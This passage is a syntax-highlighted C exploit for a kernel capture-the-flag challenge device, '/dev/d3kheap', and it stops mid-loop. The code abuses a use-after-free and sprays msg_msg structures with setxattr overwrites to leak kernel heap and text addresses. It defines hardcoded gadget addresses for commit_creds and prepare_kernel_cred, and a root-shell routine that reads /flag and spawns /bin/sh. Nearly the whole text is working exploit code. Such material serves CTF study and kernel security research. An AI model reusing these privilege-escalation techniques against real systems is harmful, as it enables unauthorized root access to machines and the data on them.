class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> MSG_COPY        040000  <span class="comment">/* copy (not remove) all queue messages */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ADD     0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_EDIT    0x4321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SHOW 	0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_DEL     0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000040</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">kernelLeakQuery</span><span class="params">(<span class="type">size_t</span> kernel_text_leak)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">switch</span> (kernel_text_leak &amp; <span class="number">0xfff</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6e9</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff812b76e9</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x980</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82101980</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x440</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e77440</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xde7</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82411de7</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x4f0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff817894f0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc90</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff833fac90</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x785</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff823c3785</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x990</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810b2990</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x900</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e49900</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x8b4</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8111b8b4</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc40</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8204ac40</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x320</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8155c320</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xee0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810d6ee0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x5e0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810e55e0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe80</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82f05e80</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x260</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82ec0260</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] fill up your dict!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((kernel_offset % <span class="number">0x100000</span>) != <span class="number">0</span>) <span class="comment">// miss hit?</span></span><br><span class="line">        kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">return</span> kernel_offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_ADD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_DEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">long</span> mtype;</span><br><span class="line">        <span class="type">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="type">void</span> *next;         <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="type">void</span> *security;     <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_search = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> kernel_text_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> page_offset_base_guess = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> msg_offset, msg_offset_count;</span><br><span class="line">    <span class="type">size_t</span> fake_ops_addr, fake_ops_offset, kmsg_addr;</span><br><span class="line">    <span class="type">int</span> kmsg_idx;</span><br><span class="line">    <span class="type">int</span> ms_qid[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">int</span> rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ms_qid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (ms_qid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span> + i, <span class="number">0X1000</span> - <span class="number">8</span>);</span><br><span class="line">        ret = msgsnd(ms_qid[i], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgsnd!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak msg_queue addr from heap</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;Z&#x27;</span>, <span class="number">0x1000</span> - <span class="number">8</span>);</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x1000</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);</span><br><span class="line">        <span class="keyword">if</span> (((buf[i] &amp; <span class="number">0xffff000000000000</span>) == <span class="number">0xffff000000000000</span>) &amp;&amp; !kernel_heap_leak &amp;&amp; (buf[i + <span class="number">3</span>] == (<span class="number">1024</span> - <span class="number">0x30</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] We got heap leak! kheap: %p\n&quot;</span>, buf[i]);</span><br><span class="line">            kernel_heap_leak = buf[i];</span><br><span class="line">            kmsg_idx = (<span class="type">int</span>)(((<span class="type">char</span>*)(&amp;buf[i + <span class="number">2</span>]))[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            fake_ops_offset = i * <span class="number">8</span> + <span class="number">0x30</span> - <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (((buf[i] &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span>) &amp;&amp; !kernel_text_leak)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);</span><br><span class="line">            kernel_offset = kernelLeakQuery(buf[i]);</span><br><span class="line">            <span class="keyword">if</span> (kernel_offset != <span class="number">0xdeadbeef</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_text_leak = buf[i];</span><br><span class="line">                kernel_base += kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (kernel_text_leak &amp;&amp; kernel_heap_leak)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!kernel_heap_leak)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to leak kernel heap!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak msg_msg addr</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x2000</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_leak - <span class="number">8</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x2000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    kmsg_addr = buf[(<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span> + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">/*puts(&quot;[*] leaking...&quot;);</span></span><br><span class="line"><span class="comment">    for (int i = (0x1000 - 0x30) / 8; i &lt; (0x2000 - 0x30) / 8 ; i++)</span></span><br><span class="line"><span class="comment">        printf(&quot;[----data dump----] %d: %p\n&quot;, i, buf[i]);*/</span></span><br><span class="line">    fake_ops_addr = kmsg_addr - fake_ops_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] UAF as fake ops addr at: %p, cal by msg idx: %d at addr: %p\n&quot;</span>, fake_ops_addr, kmsg_idx, kmsg_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak kernel text base if we didn&#x27;t leak it before</span></span><br><span class="line">    kernel_heap_search = kmsg_addr - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> leaking_times = <span class="number">0</span>; !kernel_text_leak; leaking_times++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] per leaking, no.%d time(s)\n&quot;</span>, leaking_times);</span><br><span class="line">    </span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x2000</span> - <span class="number">0x30</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_search;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Now searching: %p\n&quot;</span>, kernel_heap_search);</span><br><span class="line"></span><br><span class="line">        ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x2000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">            kernel_heap_search += <span class="number">0x1000</span> - <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        msg_offset_count = <span class="number">0</span>;</span><br><span class="line">        msg_offset = <span class="number">0xdeadbeefbad4f00d</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = (<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i &lt; (<span class="number">0x2000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);</span><br><span class="line">            <span class="keyword">if</span> ((buf[i] &gt; <span class="number">0xffffffff81000000</span>) &amp;&amp; (buf[i] &lt; <span class="number">0xffffffffbfffffff</span>) &amp;&amp; !kernel_text_leak)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);</span><br><span class="line">                kernel_offset = kernelLeakQuery(buf[i]);</span><br><span class="line">                <span class="keyword">if</span> (kernel_offset != <span class="number">0xdeadbeef</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_text_leak = buf[i];</span><br><span class="line">                    kernel_base += kernel_offset;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!buf[i])</span><br><span class="line">                msg_offset = msg_offset_count * <span class="number">8</span>;</span><br><span class="line">            msg_offset_count++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kernel_text_leak)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg_offset == <span class="number">0xdeadbeefbad4f00d</span>)</span><br><span class="line">        